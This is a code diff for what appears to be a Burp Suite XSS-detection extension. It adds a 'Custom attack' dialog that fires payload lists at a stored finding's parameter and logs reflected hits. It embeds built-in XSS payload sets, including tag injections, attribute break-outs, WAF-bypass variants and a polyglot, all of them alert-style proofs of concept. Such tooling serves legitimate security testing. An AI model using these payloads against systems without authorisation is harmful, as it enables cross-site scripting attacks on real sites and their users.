@@ -5,6 +5,7 @@ import javax.swing.event.DocumentEvent;
 import javax.swing.event.DocumentListener;
 import javax.swing.table.AbstractTableModel;
 import javax.swing.table.DefaultTableCellRenderer;
+import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 import java.io.FileWriter;
 import java.nio.charset.StandardCharsets;
@@ -25,6 +26,7 @@ public class LiveResultsPanel extends JPanel implements FindingStore.Listener {
 
     private final FindingStore store;
     private final IBurpExtenderCallbacks callbacks;
+    private final ContextualReflectionEngine engine; // null-safe: Custom Attack disables itself without it
     private final ResultsTableModel model = new ResultsTableModel();
     private final JTable table = new JTable(model);
 
@@ -50,10 +52,11 @@ public class LiveResultsPanel extends JPanel implements FindingStore.Listener {
 
     private final SimpleDateFormat timeFmt = new SimpleDateFormat("HH:mm:ss");
 
-    public LiveResultsPanel(FindingStore store, IBurpExtenderCallbacks callbacks) {
+    public LiveResultsPanel(FindingStore store, IBurpExtenderCallbacks callbacks, ContextualReflectionEngine engine) {
         super(new BorderLayout(8, 8));
         this.store = store;
         this.callbacks = callbacks;
+        this.engine = engine;
         setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
 
         add(buildCenter(), BorderLayout.CENTER);
@@ -136,9 +139,13 @@ public class LiveResultsPanel extends JPanel implements FindingStore.Listener {
         copyUrl.addActionListener(e -> copyToClipboard(get(model.getRow(table.getSelectedRow()), true)));
         JMenuItem copyPoc = new JMenuItem("Copy PoC payload");
         copyPoc.addActionListener(e -> copyToClipboard(get(model.getRow(table.getSelectedRow()), false)));
+        JMenuItem customAttack = new JMenuItem("Custom attack (payload list)...");
+        customAttack.addActionListener(e -> openCustomAttack(model.getRow(table.getSelectedRow())));
         menu.add(toRepeater);
         menu.add(copyUrl);
         menu.add(copyPoc);
+        menu.addSeparator();
+        menu.add(customAttack);
 
         table.addMouseListener(new java.awt.event.MouseAdapter() {
             @Override public void mousePressed(java.awt.event.MouseEvent e) { maybeShow(e); }
@@ -158,6 +165,48 @@ public class LiveResultsPanel extends JPanel implements FindingStore.Listener {
     private String get(XssFinding f, boolean url) {
         if (f == null) return "";
         return url ? f.url : f.poc;
+    }
+
+    /** Resolve the selected row's injection point and open the Custom Attack dialog. */
+    private void openCustomAttack(XssFinding f) {
+        if (f == null) {
+            JOptionPane.showMessageDialog(this, "Select a finding row first.", "Custom attack",
+                    JOptionPane.INFORMATION_MESSAGE);
+            return;
+        }
+        if (engine == null) {
+            JOptionPane.showMessageDialog(this, "Detection engine unavailable.", "Custom attack",
+                    JOptionPane.WARNING_MESSAGE);
+            return;
+        }
+        if (f.request == null || f.parameter == null || f.parameter.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "This row has no injectable parameter to attack.",
+                    "Custom attack", JOptionPane.WARNING_MESSAGE);
+            return;
+        }
+        ContextualReflectionEngine.Injector injector = engine.injectorForFinding(f.request, f.parameter, f.paramSource);
+        if (injector == null) {
+            JOptionPane.showMessageDialog(this,
+                    "Could not locate '" + f.parameter + "' in the stored request -- it may no longer carry "
+                    + "that parameter in the recorded form.",
+                    "Custom attack", JOptionPane.WARNING_MESSAGE);
+            return;
+        }
+        if (f.host == null || f.host.isEmpty() || callbacks == null) {
+            JOptionPane.showMessageDialog(this, "No host recorded for this finding.", "Custom attack",
+                    JOptionPane.WARNING_MESSAGE);
+            return;
+        }
+        int port = f.port > 0 ? f.port : (f.https ? 443 : 80);
+        IHttpService service;
+        try {
+            service = callbacks.buildHttpService(f.host, port, f.https);
+        } catch (Exception ex) {
+            JOptionPane.showMessageDialog(this, "Could not build target service: " + ex.getMessage(),
+                    "Custom attack", JOptionPane.ERROR_MESSAGE);
+            return;
+        }
+        new CustomAttackDialog(SwingUtilities.getWindowAncestor(this), engine, injector, service, f).setVisible(true);
     }
 
     private void copyToClipboard(String s) {
@@ -237,6 +286,15 @@ public class LiveResultsPanel extends JPanel implements FindingStore.Listener {
         export.setMaximumSize(new Dimension(Integer.MAX_VALUE, export.getPreferredSize().height));
         export.addActionListener(e -> exportCsv());
         p.add(export);
+        p.add(Box.createVerticalStrut(6));
+
+        JButton customAttackBtn = new JButton("Custom attack (payload list)...");
+        customAttackBtn.setAlignmentX(LEFT_ALIGNMENT);
+        customAttackBtn.setMaximumSize(new Dimension(Integer.MAX_VALUE, customAttackBtn.getPreferredSize().height));
+        customAttackBtn.setToolTipText("Pick the selected row's parameter and fire your own payload list at it "
+                + "(paste, load a .txt file, or start from a built-in set)");
+        customAttackBtn.addActionListener(e -> openCustomAttack(model.getRow(table.getSelectedRow())));
+        p.add(customAttackBtn);
 
         p.add(Box.createVerticalGlue());
         return p;
@@ -617,7 +675,293 @@ public class LiveResultsPanel extends JPanel implements FindingStore.Listener {
         }
     }
 
-    // ---- table model ----
+    // ---- Custom Attack: fire a user-supplied payload list at one stored finding ----
+
+    /**
+     * A handful of small, well-known starter payloads per bypass style, offered
+     * as a quick-fill so the user isn't starting from a blank text area. These
+     * are NOT the engine's own context-derived PoC (that stays automatic and
+     * confirmed-only) -- this is the user's own list, tried verbatim, exactly
+     * as typed/pasted/loaded.
+     */
+    private static final java.util.Map<String, String> BUILTIN_PAYLOAD_SETS = new java.util.LinkedHashMap<>();
+    static {
+        BUILTIN_PAYLOAD_SETS.put("Basic tags", String.join("\n",
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<body onload=alert(1)>",
+                "<iframe src=javascript:alert(1)>"));
+        BUILTIN_PAYLOAD_SETS.put("Attribute break-out", String.join("\n",
+                "\"><img src=x onerror=alert(1)>",
+                "'><img src=x onerror=alert(1)>",
+                "\" autofocus onfocus=alert(1) x=\"",
+                "' autofocus onfocus=alert(1) x='",
+                "\"><svg onload=alert(1)>"));
+        BUILTIN_PAYLOAD_SETS.put("JavaScript context", String.join("\n",
+                "';alert(1);//",
+                "\";alert(1);//",
+                "</script><img src=x onerror=alert(1)>",
+                "${alert(1)}",
+                "`;alert(1);//"));
+        BUILTIN_PAYLOAD_SETS.put("Filter / WAF bypass", String.join("\n",
+                "<svg/onload=alert(1)>",
+                "<img src=x OnErRoR=alert(1)>",
+                "<img src=x onerror=prompt(1)>",
+                "<IMG SRC=x onerror=\"&#97;lert(1)\">",
+                "javascript:alert(1)",
+                "<img src=x onerror=alert`1`>"));
+        BUILTIN_PAYLOAD_SETS.put("Polyglot", String.join("\n",
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>"));
+    }
+
+    /**
+     * Fire a user-chosen payload list (pasted, loaded from a file, or started
+     * from a built-in set) at ONE already-located parameter, one payload per
+     * live request, in a background thread. Any payload that comes back
+     * verbatim and unescaped is both shown in the results table here AND added
+     * to the main Live Results view as a Confirmed finding (source "Custom
+     * Attack"), so it is visible, filterable and exportable like any other row.
+     */
+    private final class CustomAttackDialog extends JDialog {
+        private final ContextualReflectionEngine engine;
+        private final ContextualReflectionEngine.Injector injector;
+        private final IHttpService service;
+        private final XssFinding finding;
+
+        private final JTextArea payloadArea = new JTextArea(10, 60);
+        private final JComboBox<String> builtin = new JComboBox<>(BUILTIN_PAYLOAD_SETS.keySet().toArray(new String[0]));
+        private final JLabel progress = new JLabel("0 / 0 tested, 0 reflected");
+        private final JButton startBtn = new JButton("Start attack");
+        private final JButton stopBtn = new JButton("Stop");
+        private final DefaultTableModel resultModel =
+                new DefaultTableModel(new Object[]{"Payload", "Reflected", "Status"}, 0) {
+                    @Override public boolean isCellEditable(int r, int c) { return false; }
+                };
+        private final JTable resultTable = new JTable(resultModel);
+        private final java.util.List<ContextualReflectionEngine.AttackAttempt> attempts = new ArrayList<>();
+        private final java.util.concurrent.atomic.AtomicBoolean cancelled = new java.util.concurrent.atomic.AtomicBoolean(false);
+        // FindingStore de-duplicates by context|parameter|url -- each confirmed
+        // custom payload must get a distinct context label or only the FIRST
+        // reflected payload in a run would ever make it into Live Results.
+        private final java.util.concurrent.atomic.AtomicInteger confirmedCount = new java.util.concurrent.atomic.AtomicInteger();
+        private volatile boolean running = false;
+
+        CustomAttackDialog(Window owner, ContextualReflectionEngine engine, ContextualReflectionEngine.Injector injector,
+                           IHttpService service, XssFinding finding) {
+            super(owner, "Custom attack - " + finding.parameter, ModalityType.MODELESS);
+            this.engine = engine;
+            this.injector = injector;
+            this.service = service;
+            this.finding = finding;
+            setLayout(new BorderLayout(8, 8));
+            ((JComponent) getContentPane()).setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));
+
+            JLabel header = new JLabel("<html>Target: parameter <b>" + esc(finding.parameter) + "</b> ("
+                    + esc(finding.paramSource == null || finding.paramSource.isEmpty() ? "?" : finding.paramSource)
+                    + ") on <b>" + esc(finding.host) + "</b> &mdash; context: " + esc(finding.context) + "</html>");
+            header.setBorder(BorderFactory.createEmptyBorder(0, 0, 8, 0));
+            add(header, BorderLayout.NORTH);
+
+            JPanel top = new JPanel(new BorderLayout(4, 4));
+            payloadArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
+            payloadArea.setToolTipText("One payload per line. Blank lines and lines starting with # are ignored.");
+            top.add(new JScrollPane(payloadArea), BorderLayout.CENTER);
+
+            JPanel srcRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 4, 2));
+            srcRow.add(new JLabel("Built-in set:"));
+            srcRow.add(builtin);
+            JButton insertBuiltin = new JButton("Insert");
+            insertBuiltin.addActionListener(e -> {
+                String set = BUILTIN_PAYLOAD_SETS.get(builtin.getSelectedItem());
+                if (set != null) {
+                    String cur = payloadArea.getText();
+                    payloadArea.setText(cur.isEmpty() ? set : cur + "\n" + set);
+                }
+            });
+            srcRow.add(insertBuiltin);
+            JButton loadFile = new JButton("Load from file...");
+            loadFile.addActionListener(e -> loadPayloadsFromFile());
+            srcRow.add(loadFile);
+            JButton clearBtn = new JButton("Clear");
+            clearBtn.addActionListener(e -> payloadArea.setText(""));
+            srcRow.add(clearBtn);
+            top.add(srcRow, BorderLayout.SOUTH);
+
+            JPanel runRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
+            startBtn.addActionListener(e -> startAttack());
+            stopBtn.addActionListener(e -> cancelled.set(true));
+            stopBtn.setEnabled(false);
+            runRow.add(startBtn);
+            runRow.add(stopBtn);
+            runRow.add(progress);
+
+            resultTable.setFillsViewportHeight(true);
+            resultTable.setRowHeight(20);
+            JScrollPane resultScroll = new JScrollPane(resultTable);
+            resultScroll.setBorder(BorderFactory.createTitledBorder("Results (live)"));
+            installResultContextMenu();
+
+            JPanel center = new JPanel(new BorderLayout(4, 4));
+            center.add(top, BorderLayout.NORTH);
+            center.add(runRow, BorderLayout.CENTER);
+            JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, center, resultScroll);
+            split.setResizeWeight(0.4);
+            split.setDividerLocation(260);
+            add(split, BorderLayout.CENTER);
+
+            setSize(760, 560);
+            setLocationRelativeTo(owner);
+        }
+
+        private void installResultContextMenu() {
+            JPopupMenu menu = new JPopupMenu();
+            JMenuItem toRep = new JMenuItem("Send request to Repeater");
+            toRep.addActionListener(e -> {
+                int row = resultTable.getSelectedRow();
+                if (row < 0 || row >= attempts.size()) return;
+                ContextualReflectionEngine.AttackAttempt a = attempts.get(row);
+                if (a.requestResponse == null || a.requestResponse.getRequest() == null) return;
+                try {
+                    callbacks.sendToRepeater(finding.host, finding.port > 0 ? finding.port : (finding.https ? 443 : 80),
+                            finding.https, a.requestResponse.getRequest(), "Custom: " + finding.parameter);
+                } catch (Exception ex) {
+                    JOptionPane.showMessageDialog(CustomAttackDialog.this, "Send to Repeater failed: " + ex.getMessage());
+                }
+            });
+            menu.add(toRep);
+            resultTable.setComponentPopupMenu(menu);
+        }
+
+        private void loadPayloadsFromFile() {
+            JFileChooser fc = new JFileChooser();
+            if (fc.showOpenDialog(this) != JFileChooser.APPROVE_OPTION) {
+                return;
+            }
+            try {
+                StringBuilder sb = new StringBuilder();
+                for (String line : java.nio.file.Files.readAllLines(fc.getSelectedFile().toPath(), StandardCharsets.UTF_8)) {
+                    sb.append(line).append('\n');
+                }
+                String cur = payloadArea.getText();
+                payloadArea.setText(cur.isEmpty() ? sb.toString() : cur + "\n" + sb);
+            } catch (Exception ex) {
+                JOptionPane.showMessageDialog(this, "Could not read file: " + ex.getMessage(),
+                        "Load payloads", JOptionPane.ERROR_MESSAGE);
+            }
+        }
+
+        private List<String> parsePayloads() {
+            List<String> out = new ArrayList<>();
+            for (String line : payloadArea.getText().split("\n", -1)) {
+                String t = line.trim();
+                if (t.isEmpty() || t.startsWith("#")) {
+                    continue;
+                }
+                out.add(line); // keep internal spacing; only outer blank/comment lines are filtered
+            }
+            return out;
+        }
+
+        private void startAttack() {
+            if (running) {
+                return;
+            }
+            List<String> payloads = parsePayloads();
+            if (payloads.isEmpty()) {
+                JOptionPane.showMessageDialog(this, "Paste, load, or insert at least one payload first.",
+                        "Custom attack", JOptionPane.INFORMATION_MESSAGE);
+                return;
+            }
+            final int cap = 2000;
+            if (payloads.size() > cap) {
+                int res = JOptionPane.showConfirmDialog(this,
+                        payloads.size() + " payloads is a lot (capped at " + cap + " for this run). Continue with the first "
+                        + cap + "?", "Custom attack", JOptionPane.YES_NO_OPTION);
+                if (res != JOptionPane.YES_OPTION) {
+                    return;
+                }
+                payloads = payloads.subList(0, cap);
+            }
+            attempts.clear();
+            resultModel.setRowCount(0);
+            cancelled.set(false);
+            running = true;
+            startBtn.setEnabled(false);
+            stopBtn.setEnabled(true);
+            final List<String> finalPayloads = payloads;
+            Thread worker = new Thread(() -> runAttack(finalPayloads), "XSSDetector-CustomAttack");
+            worker.setDaemon(true);
+            worker.start();
+        }
+
+        private void runAttack(List<String> payloads) {
+            int reflected = 0;
+            int total = payloads.size();
+            for (int i = 0; i < total; i++) {
+                if (cancelled.get()) {
+                    break;
+                }
+                String payload = payloads.get(i);
+                ContextualReflectionEngine.AttackAttempt a = engine.runCustomPayload(injector, service, payload);
+                if (a.reflectedUnescaped) {
+                    reflected++;
+                    recordConfirmedCustom(a);
+                }
+                final int done = i + 1;
+                final int reflectedSoFar = reflected;
+                SwingUtilities.invokeLater(() -> {
+                    attempts.add(a);
+                    resultModel.addRow(new Object[]{
+                            truncate(a.payload, 120),
+                            a.reflectedUnescaped ? "YES" : (a.error != null ? "error" : "no"),
+                            a.statusCode > 0 ? String.valueOf(a.statusCode) : (a.error != null ? a.error : "-")
+                    });
+                    progress.setText(done + " / " + total + " tested, " + reflectedSoFar + " reflected");
+                });
+            }
+            SwingUtilities.invokeLater(() -> {
+                running = false;
+                startBtn.setEnabled(true);
+                stopBtn.setEnabled(false);
+                if (cancelled.get()) {
+                    progress.setText(progress.getText() + " (stopped)");
+                }
+            });
+        }
+
+        /** A custom payload that came back verbatim/unescaped is live, confirmed
+         *  evidence -- add it to the main Live Results view like any other find. */
+        private void recordConfirmedCustom(ContextualReflectionEngine.AttackAttempt a) {
+            try {
+                IHttpRequestResponse rr = a.requestResponse;
+                if (rr == null) {
+                    return;
+                }
+                int n = confirmedCount.incrementAndGet();
+                XssFinding xf = new XssFinding(
+                        "High", XssFinding.STATUS_CONFIRMED,
+                        finding.context + " (custom payload #" + n + ")", finding.parameter,
+                        finding.method, finding.host, finding.url, "Custom Attack", a.payload,
+                        rr.getRequest(), rr.getResponse());
+                xf.reqHighlight = a.payload;
+                xf.respHighlight = a.payload;
+                xf.technique = "custom payload list";
+                xf.paramSource = finding.paramSource;
+                xf.testedContextually = true;
+                xf.port = finding.port;
+                xf.https = finding.https;
+                FindingStore.get().add(xf);
+            } catch (Exception ignored) {
+                // reporting-side failures must never break the running attack
+            }
+        }
+
+        private String truncate(String s, int max) {
+            if (s == null) return "";
+            return s.length() <= max ? s : s.substring(0, max) + "...";
+        }
+    }
 
     private class ResultsTableModel extends AbstractTableModel {
         private final String[] cols =
